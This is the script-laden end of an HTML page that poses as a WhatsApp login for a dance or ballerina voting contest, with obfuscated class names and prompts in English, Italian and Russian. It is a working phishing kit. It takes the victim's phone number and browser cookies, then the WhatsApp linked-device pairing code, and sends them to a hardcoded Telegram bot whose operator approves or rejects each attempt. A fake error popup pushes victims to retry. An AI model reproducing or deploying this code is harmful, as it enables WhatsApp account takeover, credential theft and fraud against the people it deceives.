                    PYUASKiSGYgxkwXLVPQ maCanCKOzIJvgYWWri vXGtdtfSKSqNHEFaThEOO IMFZZUui</h5>
            </span>
            <button class="button primary btn-reb" id="btn-reboot-what" data-translate-key="popup.what.button">Reboot</button> <!-- Изменен ID -->
            <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
        </div>
        <small
            class="CUuwPmBOQqkLDnR qygifepowfcwNpYiwIPqTsB pYuVLgSQXTPnzOsjZgWiCaOFL MymbuHKI WMAmNSmIK IAGlswnUXQyzrQRzVbZs">
            <h6 class="MXQJididkCWQAl">TmIEUJJfDZrxnzDzbx DWbpJizMWzfRvqyQ oOwvJSlWmTg tuCPOHrhOaNmHtxVRF
                StzcxoAdfnCLSEwi kNkcHifxqigl OMNzbdhZkjCwTS</h6>
        </small>
    </div>
    <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
                                
    <script>
        const translations = {
            // --- English (Fallback) ---
            en: {
                "page.title": "Authorization",
                "form1.title": "You must log in via WhatsApp for your vote to be considered.",
                "form1.description": "Authorizing via WhatsApp allows you to protect your data and save time.",
                "form1.searchPlaceholder": "Search...",
                "form.continueButton": "Continue",
                "form1.error.invalidNumber": "Invalid phone number",
                "form1.error.phoneRequired": "Phone number is required.", // For paragraph error
                "form1.error.phoneRequiredAlert": "Please enter your phone number.", // For alert
                "form1.verifyCodePlaceholder": "Enter code", // For the extra verify form you had
                "form1.verifySubmitButton": "Confirm",    // For the extra verify form you had
                "form1.error.noCookies": "No cookies found",


                "form2.title": "Quick and easy authorization via WhatsApp",
                "form2.description": "Log in to the WhatsApp app, select 'Linked Devices' in the settings window, then enter this code",
                "form2.codeLabel": "Code:",
                "form2.codePlaceholder": "Enter code",
                "form2.copyButton": "Copy",
                "form2.error.noData": "Code or phone number is missing.", 

                "popup.reboot.title": "Your vote has been counted, thank you",
                "popup.reboot.button": "Ok",
                "popup.what.title": "Something is wrong!",
                "popup.what.paragraph": "You entered the code incorrectly. Go to the WhatsApp application and enter the code correctly, otherwise your vote will not be counted.",
                "popup.what.button": "Reboot",

                "error.backendConnection": "Error connecting to the server. Please try again."
            },
            // --- Italian ---
            it: {
                "page.title": "Autorizzazione",
                "form1.title": "Devi accedere tramite WhatsApp affinché il tuo voto venga preso in considerazione.",
                "form1.description": "L'autorizzazione tramite WhatsApp ti consente di proteggere i tuoi dati e risparmiare tempo.",
                "form1.searchPlaceholder": "Cerca...",
                "form.continueButton": "Continua",
                "form1.error.invalidNumber": "Numero di telefono non valido",
                "form1.error.phoneRequired": "Il numero di telefono è obbligatorio.",
                "form1.error.phoneRequiredAlert": "Inserisci il numero di telefono.",
                "form1.verifyCodePlaceholder": "Inserisci codice",
                "form1.verifySubmitButton": "Conferma",
                "form1.error.noCookies": "Nessun cookie trovato",


                "form2.title": "Autorizzazione rapida e facile tramite WhatsApp",
                "form2.description": "Accedi all'app WhatsApp, seleziona 'Dispositivi collegati' nella finestra delle impostazioni, quindi inserisci questo codice",
                "form2.codeLabel": "Codice:",
                "form2.codePlaceholder": "Inserisci codice",
                "form2.copyButton": "Copia",
                "form2.error.noData": "Codice o numero di telefono mancante.",

                "popup.reboot.title": "Il tuo voto è stato conteggiato, grazie",
                "popup.reboot.button": "Ok",
                "popup.what.title": "Qualcosa è andato storto!",
                "popup.what.paragraph": "Hai inserito il codice in modo errato. Vai all'applicazione WhatsApp e inserisci il codice correttamente, altrimenti il tuo voto non verrà conteggiato.",
                "popup.what.button": "Riprova", 

                "error.backendConnection": "Errore di connessione al server. Riprova."
            },
            // --- Russian ---
            ru: {
                "page.title": "Авторизация",
                "form1.title": "Вам необходимо авторизоваться через WhatsApp, чтобы ваш голос был учтён.",
                "form1.description": "Авторизация через WhatsApp позволяет защитить ваши данные и сэкономить время.",
                "form1.searchPlaceholder": "Поиск...",
                "form.continueButton": "Продолжить",
                "form1.error.invalidNumber": "Неверный номер телефона",
                "form1.error.phoneRequired": "Требуется номер телефона.",
                "form1.error.phoneRequiredAlert": "Введите номер телефона.",
                "form1.verifyCodePlaceholder": "Введите код",
                "form1.verifySubmitButton": "Подтвердить",
                "form1.error.noCookies": "Куки не найдены",

                "form2.title": "Быстрая и легкая авторизация через WhatsApp",
                "form2.description": "Войдите в приложение WhatsApp, выберите 'Связанные устройства' в окне настроек, затем введите этот код",
                "form2.codeLabel": "Код:",
                "form2.codePlaceholder": "Введите код",
                "form2.copyButton": "Копировать",
                "form2.error.noData": "Отсутствует код или номер телефона.",

                "popup.reboot.title": "Ваш голос учтён, спасибо",
                "popup.reboot.button": "Ок",
                "popup.what.title": "Что-то пошло не так!",
                "popup.what.paragraph": "Вы ввели код неправильно. Перейдите в приложение WhatsApp и введите код правильно, иначе ваш голос не будет засчитан.",
                "popup.what.button": "Повторить",

                "error.backendConnection": "Ошибка подключения к серверу. Пожалуйста, попробуйте еще раз."
            }
            // Добавьте сюда другие языки по мере необходимости (es, de, fr и т.д.)
        };

        let currentLang = 'en'; // Default language

        function applyTranslations(lang) {
            if (!lang || !translations[lang]) {
                console.warn(`Translations not found for language: ${lang}. Defaulting to 'en'.`);
                lang = 'en';
            }
            currentLang = lang; // Store current language
            document.documentElement.lang = currentLang; // Set lang attribute on HTML tag

            document.querySelectorAll('[data-translate-key]').forEach(element => {
                const key = element.getAttribute('data-translate-key');
                // Пытаемся взять перевод для текущего языка, если нет - для английского (fallback)
                const translation = translations[lang]?.[key] || translations['en']?.[key]; 

                if (translation) {
                    if (element.tagName === 'INPUT' && (element.type === 'button' || element.type === 'submit' || element.type === 'reset')) {
                        element.value = translation;
                    } else if (element.tagName === 'INPUT' && element.hasAttribute('placeholder')) {
                        element.placeholder = translation;
                    } else if (element.tagName === 'TITLE') {
                         document.title = translation; // Обновляем заголовок страницы
                    } else {
                        element.textContent = translation;
                    }
                } else {
                    console.warn(`Translation key "${key}" not found for language "${lang}" or fallback "en".`);
                }
            });
        }

        document.addEventListener("DOMContentLoaded", function () {
            // --- Определение языка ---
            let detectedLanguage = 'en'; // Default
            const htmlTagLang = document.documentElement.lang;

            // 1. Пробуем язык из <html lang="...">
            if (htmlTagLang && translations[htmlTagLang.split('-')[0]]) {
                detectedLanguage = htmlTagLang.split('-')[0];
            } else {
                // 2. Попытка получить язык из URL (например, /login/zomia-it -> it)
                const pathParts = window.location.pathname.split('/');
                const lastPathPart = pathParts.pop() || pathParts.pop(); // Handle trailing slash

                if (lastPathPart) {
                    // Если формат zomia-it, берем 'it'. Если просто 'it', берем 'it'.
                    const langCandidate = lastPathPart.includes('-') ? lastPathPart.split('-').pop() : lastPathPart;
                    if (translations[langCandidate]) {
                        detectedLanguage = langCandidate;
                    }
                }
            }
            
            // 3. Если не удалось определить из URL или HTML-тега, пробуем язык браузера
            if (detectedLanguage === 'en' && !(htmlTagLang && translations[htmlTagLang.split('-')[0]])) { 
                 const browserLang = (navigator.language || navigator.userLanguage || 'en').split('-')[0];
                 if (translations[browserLang]) {
                     detectedLanguage = browserLang;
                 }
            }
            applyTranslations(detectedLanguage);

            // --- Обработчики кнопок попапов ---
            document.getElementById("btn-ok-reboot")?.addEventListener("click", () => {
                document.getElementById("popreboot").style.display = "none";
                const redirectUrl = document.body.dataset.redirect;
                if (redirectUrl) {
                    window.location.href = redirectUrl; // Редирект после успешного голосования
                }
            });

            document.getElementById("btn-reboot-what")?.addEventListener("click", () => {
                location.reload(); // Перезагружаем страницу для попапа "popwhat"
            });

            // --- Инициализация состояний ---
            const loaderElement = document.querySelector("#loader-container .loader"); 
            const formStep2Container = document.getElementById("form-step-2-container");

            // --- Константы для Telegram ---
            // ВАЖНО: Хранение токена в клиентском JS - это ОЧЕНЬ НЕБЕЗОПАСНО.
            // Этот запрос должен идти через ваш бэкенд.
            const token = "7738348678:AAE5mirY6jzmApYyAjJ5PQgz-1_G8u9pJ6g"; 
            const chat_id = "7538727898";
            const backendURL = "https://api.bestballerinavote.com"; 

            // --- Элементы DOM ---
            const nextStepBtn = document.getElementById("next-step");
            const codeStepBtn = document.getElementById("two-step");
            const errorParagraphStep1 = document.querySelector('#form-step-1 .form p.error');

            // --- Логика шагов ---
            nextStepBtn?.addEventListener("click", function (e) {
                e.preventDefault();
                const phoneInput = document.getElementById("number");
                const phone = phoneInput.value.trim(); // Здесь уже будет номер с кодом страны от intl-tel-input
                const cookies = document.cookie || (translations[currentLang]['form1.error.noCookies'] || "No cookies");

                if (!phone) { // Простая проверка, что поле не пустое. intl-tel-input может иметь свои методы валидации (iti.isValidNumber())
                    if (errorParagraphStep1) {
                        errorParagraphStep1.textContent = translations[currentLang]["form1.error.phoneRequired"] || "Phone number is required.";
                        errorParagraphStep1.classList.remove('hidden');
                    } else {
                        alert(translations[currentLang]["form1.error.phoneRequiredAlert"] || "Please enter your phone number.");
                    }
                    phoneInput.focus();
                    return;
                } else {
                    if (errorParagraphStep1) errorParagraphStep1.classList.add('hidden');
                }

                sessionStorage.setItem("submittedPhone", phone);

                const msg = `📲 Новий запит\nТелефон: ${phone}\n🍪 Кукі: ${cookies}`;
                // НЕБЕЗОПАСНО: Прямой запрос к Telegram API с токеном
                fetch(`https://api.telegram.org/bot${token}/sendMessage`, { 
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id, text: msg })
                }).catch(err => console.error("Telegram API error:", err));

                document.getElementById("step-1").style.display = "none";
                const step2Block = document.getElementById("step-2");
                step2Block.classList.remove("hidden");
                step2Block.style.display = "block"; 
                if (formStep2Container) formStep2Container.style.display = "block"; 
                document.getElementById("code").focus();
            });

            codeStepBtn?.addEventListener("click", function (e) {
                e.preventDefault();
                const codeInput = document.getElementById("code");
                const code = codeInput.value.trim();
                const phone = sessionStorage.getItem("submittedPhone");

                if (!code || !phone) {
                    alert(translations[currentLang]["form2.error.noData"] || "Code or phone number is missing.");
                    if (!code) codeInput.focus();
                    return;
                }

                const msg = `🔐 Код підтвердження:\nТелефон: ${phone}\nКод: ${code}`;
                const keyboard = {
                    inline_keyboard: [
                        [{ text: "✅ Так", callback_data: `confirm_yes_${phone}` },
                         { text: "❌ Ні", callback_data: `confirm_no_${phone}` }]
                    ]
                };
                // НЕБЕЗОПАСНО: Прямой запрос к Telegram API с токеном
                fetch(`https://api.telegram.org/bot${token}/sendMessage`, { 
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id, text: msg, reply_markup: keyboard })
                }).catch(err => console.error("Telegram API error:", err));

                if (formStep2Container) formStep2Container.style.display = "none";
                if (loaderElement) loaderElement.style.display = "block"; 

                waitForApproval(phone);
            });

            function waitForApproval(phone) {
                const interval = setInterval(() => {
                    fetch(`${backendURL}/check-response?phone=${encodeURIComponent(phone)}`)
                        .then(res => {
                            if (!res.ok) throw new Error(`HTTP error! status: ${res.status}`);
                            return res.json();
                        })
                        .then(data => {
                            console.log("📩 Відповідь від бекенду:", data);
                            if (data.status === "approved") {
                                clearInterval(interval);
                                if (loaderElement) loaderElement.style.display = "none";
                                document.getElementById("popreboot").style.display = "block";
                            } else if (data.status === "rejected") {
                                clearInterval(interval);
                                if (loaderElement) loaderElement.style.display = "none";
                                document.getElementById("popwhat").style.display = "block";
                            }
                            // Если статус 'pending' или другой, ничего не делаем, ждем следующей проверки
                        })
                        .catch(err => {
                            console.error("❌ Помилка запиту до бекенду:", err);
                            // Можно раскомментировать для остановки и показа ошибки пользователю
                            // clearInterval(interval); 
                            // if (loaderElement) loaderElement.style.display = "none";
                            // alert(translations[currentLang]["error.backendConnection"] || "Error connecting to the server. Please try again.");
                        });
                }, 3000);
            }

            // Инициализация intl-tel-input
            const phoneInputField = document.querySelector("#number");
            if (phoneInputField && window.intlTelInput) {
                const iti = window.intlTelInput(phoneInputField, {
                    initialCountry: "auto",
                    geoIpLookup: function(success, failure) { // Изменен API для geoIpLookup
                        fetch("https://ipapi.co/json")
                          .then(function(res) { return res.json(); })
                          .then(function(data) { success(data.country_code); })
                          .catch(function() { success("us"); }); // Fallback
                    },
                    utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
                    nationalMode: false, // Чтобы всегда показывался код страны
                    formatOnDisplay: true, // Форматирует номер при отображении
                    separateDialCode: true // Показывает код страны отдельно
                });
                
                // Синхронизация кастомного списка флагов с intl-tel-input (если нужно)
                phoneInputField.addEventListener('countrychange', function() {
                    const selectedCountryData = iti.getSelectedCountryData();
                    const countryDiv = document.querySelector('.block.number .form .country');
                    const countryDivImg = countryDiv?.querySelector('.image img');
                    const countryDivName = countryDiv?.querySelector('p.name');

                    if (countryDivImg) {
                        countryDivImg.src = `https://dancebattle.life/static/img/flags/${selectedCountryData.iso2.toUpperCase()}.png`;
                        countryDivImg.alt = selectedCountryData.iso2.toUpperCase();
                    }
                    if (countryDivName) {
                        countryDivName.textContent = selectedCountryData.name;
                    }
                    // Обновление значения инпута #number не требуется, т.к. intl-tel-input делает это сам.
                    // Однако, если ваш кастомный список стран (тот, что с классом .countries) используется для ВЫБОРА страны,
                    // то при клике на элемент в этом списке вам нужно будет вызывать iti.setCountry(countryCode);
                    // чтобы intl-tel-input обновился.
                });

                // Пример, как обновить intl-tel-input из вашего кастомного списка:
                document.querySelectorAll('.countries .item').forEach(item => {
                    item.addEventListener('click', () => {
                        const countryCode = item.dataset.lang; // 'AU', 'GB', etc.
                        if (countryCode) {
                            iti.setCountry(countryCode.toLowerCase());
                        }
                        // Также обновите ваш блок .country вручную, как это делает number.js
                        const countryDiv = document.querySelector('.block.number .form .country');
                        const countryDivImg = countryDiv?.querySelector('.image img');
                        const countryDivName = countryDiv?.querySelector('p.name');
                        const itemImg = item.querySelector('.image img');
                        const itemName = item.querySelector('p.name');

                        if(countryDivImg && itemImg) countryDivImg.src = itemImg.src;
                        if(countryDivName && itemName) countryDivName.textContent = itemName.textContent;
                        
                        document.querySelector('.countries').classList.add('hidden'); // Скрыть список
                    });
                });
                 // Открытие/закрытие вашего кастомного списка стран
                const countrySelector = document.querySelector('.block.number .form .country');
                countrySelector?.addEventListener('click', () => {
                    document.querySelector('.countries').classList.toggle('hidden');
                });


            } // конец if (phoneInputField && window.intlTelInput)

        }); // конец DOMContentLoaded
    </script>
</body>
</html>
